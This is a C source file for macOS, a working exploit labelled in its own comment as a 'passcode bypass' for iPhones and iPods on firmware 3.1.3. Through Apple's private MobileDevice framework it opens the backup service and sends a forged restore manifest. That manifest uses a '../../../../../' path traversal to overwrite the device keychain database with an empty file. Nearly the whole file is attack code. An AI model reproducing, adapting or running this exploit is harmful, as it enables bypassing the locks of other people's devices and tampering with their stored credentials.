#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <dlfcn.h>
#include <sys/socket.h>
#include <CoreFoundation/CoreFoundation.h>

#include "sha.h"
#include "MobileDevice.h"

#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"

//==== CoreFoundation Helpers ====
#define number_with_int(x) CFNumberCreate(NULL, kCFNumberSInt32Type, (int[]){x})
#define number_with_cfindex(x) CFNumberCreate(NULL, kCFNumberCFIndexType, (CFIndex[]){x})
#define make_dict(args...) make_dict_(sizeof((const void *[]){args}) / sizeof(const void *) / 2, (const void *[]){args})
void *make_dict_(int num_els, const void **stuff) {
    CFMutableDictionaryRef ref = CFDictionaryCreateMutable(NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    while(num_els--) {
        const void *value = *stuff++;
        const void *key = *stuff++;
        CFDictionarySetValue(ref, key, value);
    }
    return ref;
}

#define make_array(args...) make_array_(sizeof((const void *[]){args}) / sizeof(const void *), (const void *[]){args})
void *make_array_(int num_els, const void **stuff) {
    CFMutableArrayRef ref = CFArrayCreateMutable(NULL, 0, &kCFTypeArrayCallBacks);
    while(num_els--) {
        CFArrayAppendValue(ref, *stuff++);
    }
    return ref;
}

#define alloc(x) CFAllocatorAllocate(NULL, (x), 0)
#define create_data(pl) CFPropertyListCreateXMLData(NULL, pl)
#define create_with_data(data, mut) CFPropertyListCreateFromXMLData(NULL, data, mut, NULL)

void printCFString(CFStringRef input) {
    const char *cs = CFStringGetCStringPtr(input, kCFStringEncodingMacRoman);
    puts(cs);
}


//==== Data helpers ====
CFStringRef data_to_hex(CFDataRef input) {
    CFMutableStringRef result = CFStringCreateMutable(NULL, 40);
    const unsigned char *bytes = CFDataGetBytePtr(input);
    unsigned int len = CFDataGetLength(input);
    unsigned int i;
    for(i = 0; i < len; i++) {
        CFStringAppendFormat(result, NULL, CFSTR("%02x"), (unsigned int) bytes[i]);
    }
    return result;
}

CFDataRef sha1_of_data(CFDataRef input) {
    char *md = alloc(20);
    SHA_CTX ctx;
    SHA1_Init(&ctx);
    SHA1_Update(&ctx, CFDataGetBytePtr(input), CFDataGetLength(input));
    SHA1_Final(md, &ctx);
    return CFDataCreateWithBytesNoCopy(NULL, md, 20, NULL);
}



//==== Apple Mobile Device Framework ====
void *mobile_device_framework;
int (*am_device_notification_subscribe)(void *, int, int, void *, am_device_notification **);
mach_error_t (*am_device_connect)(struct am_device *device);
mach_error_t (*am_device_is_paired)(struct am_device *device);
mach_error_t (*am_device_validate_pairing)(struct am_device *device);
mach_error_t (*am_device_start_session)(struct am_device *device);
mach_error_t (*am_device_start_service)(struct am_device *device, CFStringRef service_name, service_conn_t *handle, unsigned int *unknown);

CFStringRef (*am_device_copy_value)(struct am_device *device, unsigned int, CFStringRef cfstring);
CFStringRef (*am_device_copy_device_identifier)(struct am_device *device);


/*   
    ========== loadAndLinkAMFramworks() ========== 
    Loads and dynamically links our required methods from MobileDevice.framework to this program
*/
void loadAndLinkAMFramworks() {
    mobile_device_framework = dlopen("/System/Library/PrivateFrameworks/MobileDevice.framework/MobileDevice", RTLD_NOW);

    am_device_notification_subscribe = dlsym(mobile_device_framework, "AMDeviceNotificationSubscribe");
	am_device_connect = dlsym(mobile_device_framework, "AMDeviceConnect");
	am_device_is_paired = dlsym(mobile_device_framework, "AMDeviceIsPaired");
	am_device_validate_pairing = dlsym(mobile_device_framework, "AMDeviceValidatePairing");
	am_device_start_session = dlsym(mobile_device_framework, "AMDeviceStartSession");
    am_device_copy_value = dlsym(mobile_device_framework, "AMDeviceCopyValue");
    am_device_start_service = dlsym(mobile_device_framework, "AMDeviceStartService");
    am_device_copy_device_identifier = dlsym(mobile_device_framework, "AMDeviceCopyDeviceIdentifier");
}

// Relevant info of our current device
static am_device *device;
CFStringRef deviceInfo;


// === Mobile Restore ===
#define send_msg(a, b) send_msg_(__func__, a, b)
#define receive_msg(a) receive_msg_(__func__, a)

static void send_msg_(const char *caller, service_conn_t conn, CFPropertyListRef plist) {
    CFDataRef data = create_data(plist);
    uint32_t size = htonl(CFDataGetLength(data));

    send(conn, &size, sizeof(size), 0);
    send(conn, CFDataGetBytePtr(data), CFDataGetLength(data), 0);

    CFRelease(data);
}

static void receive_msg_(const char *caller, service_conn_t conn) {
    uint32_t size;

    ssize_t ret = recv((int) conn, &size, sizeof(size), 0);
    size = ntohl(size);

    void *buf = alloc(size);
    char *p = buf; uint32_t br = size;
    while(br) {
        ret = recv((int) conn, p, br, 0);
        br -= ret;
        p += ret;
    }

    CFDataRef data = CFDataCreateWithBytesNoCopy(NULL, buf, size, NULL);
    CFPropertyListRef result = create_with_data(data, kCFPropertyListImmutable);

    CFStringRef strResult = CFStringCreateWithFormat(NULL, NULL,CFSTR("%@"), result);
    printCFString(strResult);

    CFRelease(data);
    CFRelease(result);
    CFRelease(strResult);
}


// ==== This helper will create a special restore file ===
void *add_file(CFMutableDictionaryRef files, CFDataRef crap, CFStringRef domain, CFStringRef path, int uid, int gid, int mode) {
    CFDataRef pathdata = CFStringCreateExternalRepresentation(NULL, path, kCFStringEncodingUTF8, 0);
    CFStringRef manifestkey = data_to_hex(sha1_of_data(pathdata));
    CFMutableDictionaryRef dict = make_dict(
        domain, CFSTR("Domain"),
        path, CFSTR("Path"),
        kCFBooleanFalse, CFSTR("Greylist"),
        CFSTR("3.0"), CFSTR("Version"),
        crap, CFSTR("Data")
        );

    char *datahash = alloc(20);
    char *extra = ";(null);(null);(null);3.0";
    SHA_CTX ctx;
    SHA1_Init(&ctx);
    SHA1_Update(&ctx, CFDataGetBytePtr(crap), CFDataGetLength(crap));
    SHA1_Update(&ctx, CFDataGetBytePtr(pathdata), CFDataGetLength(pathdata));
    SHA1_Update(&ctx, extra, strlen(extra));
    SHA1_Final(datahash, &ctx);

    CFDictionarySetValue(files,
        manifestkey,
        make_dict(
            CFDataCreateWithBytesNoCopy(NULL, datahash, 20, kCFAllocatorNull), CFSTR("DataHash"),
            domain, CFSTR("Domain"),
            number_with_cfindex(CFDataGetLength(crap)), CFSTR("FileLength"),
            number_with_int(gid), CFSTR("Group ID"),
            number_with_int(uid), CFSTR("User ID"),
            number_with_int(mode), CFSTR("Mode"),
            CFDateCreate(NULL, 2020964986UL), CFSTR("ModificationTime")
        ));
    
    CFStringRef templateo = CFStringCreateWithFormat(NULL, NULL, CFSTR("/tmp/stuff.%06d"), arc4random());
    CFMutableDictionaryRef info = make_dict(
        templateo, CFSTR("DLFileDest"),
        path, CFSTR("Path"),
        CFSTR("3.0"), CFSTR("Version"),
        crap, CFSTR("Crap")
    );

    return info;
}

void send_file(service_conn_t conn, CFMutableDictionaryRef info) {
    CFDictionarySetValue(info, CFSTR("DLFileAttributesKey"), make_dict());
    CFDictionarySetValue(info, CFSTR("DLFileSource"), CFDictionaryGetValue(info, CFSTR("DLFileDest")));
    CFDictionarySetValue(info, CFSTR("DLFileIsEncrypted"), number_with_int(0));
    CFDictionarySetValue(info, CFSTR("DLFileOffsetKey"), number_with_int(0));

    CFDataRef crap = CFDictionaryGetValue(info, CFSTR("Crap"));
    CFDictionaryRemoveValue(info, CFSTR("Crap"));
    CFDictionarySetValue(info, CFSTR("DLFileStatusKey"), number_with_int(2));
    send_msg(conn, make_array(CFSTR("DLSendFile"), crap, info));
    receive_msg(conn);
}


// ==== Perform Device Restore ====
static void mobiledevice_restore(service_conn_t connection, CFMutableDictionaryRef files) {
    CFStringRef restore_info = CFStringCreateWithFormat(NULL, NULL, CFSTR("[RESTORE] Starting Restore with files: %@"), files);
    printCFString(restore_info);

    CFStringRef deviceId = am_device_copy_device_identifier(device);

    CFMutableDictionaryRef m1dict = make_dict(
        CFSTR("6.2"), 							CFSTR("Version"),
        deviceId, 								CFSTR("DeviceId"),
        make_dict(), 							CFSTR("Applications"),
        files, 									CFSTR("Files")
    );
    CFDataRef m1data = create_data(m1dict);

    CFMutableDictionaryRef manifest = make_dict(
        CFSTR("2.0"),							CFSTR("AuthVersion"),
        sha1_of_data(m1data), 					CFSTR("AuthSignature"),
        number_with_int(0), 					CFSTR("IsEncrypted"),
        m1data, 								CFSTR("Data")
    );

    CFMutableDictionaryRef mdict = make_dict(
        CFSTR("kBackupMessageRestoreRequest"), 	CFSTR("BackupMessageTypeKey"),
        kCFBooleanTrue,						CFSTR("BackupNotifySpringBoard"),
        kCFBooleanTrue, 						CFSTR("BackupPreserveCameraRoll"),
        CFSTR("3.0"), 							CFSTR("BackupProtocolVersion"),
        manifest, 								CFSTR("BackupManifestKey")
    );

    send_msg(connection, make_array(CFSTR("DLMessageProcessMessage"), mdict));
    receive_msg(connection);
}



//==== Device Notification Callback ====

/* This method will perform the passcode bypass once a compatible iPod/iPhone is detected. */
static void device_notification_callback(am_device_notification_callback_info *info, void *foo) 
{	
	if (info->msg != ADNCI_MSG_CONNECTED) { 
        puts("Device disconnected!");
        return; 
    }

    device = info->dev;

	if (am_device_connect(device)) { 
        puts("Connection Failed during am_device_connect!");
        return; 
    }

	if (!am_device_is_paired(device)) { 
        puts("Device is not paired!"); 
        return; 
    }

	if (am_device_validate_pairing(device)) { 
        puts("Device pairing validation failed!"); 
        return; 
    }

	if (am_device_start_session(device)) { 
        puts("Failed to start device session!"); 
        return; 
    }    

    deviceInfo = CFStringCreateWithFormat(
            NULL,
            NULL,
            CFSTR("[INFO] Device connected --> Model: %@ Firmware version: %@"),
            am_device_copy_value(device, 0, CFSTR("ProductType")),
            am_device_copy_value(device, 0, CFSTR("ProductVersion"))
    );

    printCFString(deviceInfo);

    if(CFStringFind(deviceInfo, CFSTR("3.1.3"), kCFCompareCaseInsensitive).location != kCFNotFound) {
        CFDataRef empty_data = CFDataCreateWithBytesNoCopy(NULL, "", 0, kCFAllocatorNull);

        service_conn_t service_connection;
        am_device_start_service(device, CFSTR("com.apple.mobilebackup"), &service_connection, NULL);
        receive_msg(service_connection);

        send_msg(service_connection, make_array(CFSTR("DLMessageVersionExchange"), CFSTR("DLVersionsOk")));
        receive_msg(service_connection);

        CFMutableDictionaryRef files = make_dict();
        CFMutableDictionaryRef keychain = add_file(files, empty_data, CFSTR("HomeDomain"), CFSTR("Library/Preferences/SystemConfiguration/../../../../../var/Keychains/keychain-2.db"),0, 0, 0600);

        mobiledevice_restore(service_connection, files);
        sleep(1); //Wait 1 second for restoremode to be enabled on the iDevice

        send_file(service_connection, keychain);
        close(service_connection);

        puts("[INFO] Process completed!");
        exit(0);

    } else {
        puts("[INFO] Device not supported!");
    }
}


int main(void) {
    loadAndLinkAMFramworks();

    am_device_notification *notif;
	am_device_notification_subscribe(device_notification_callback, 0, 0, NULL, &notif);

    CFRunLoopRun();
    return 0;
}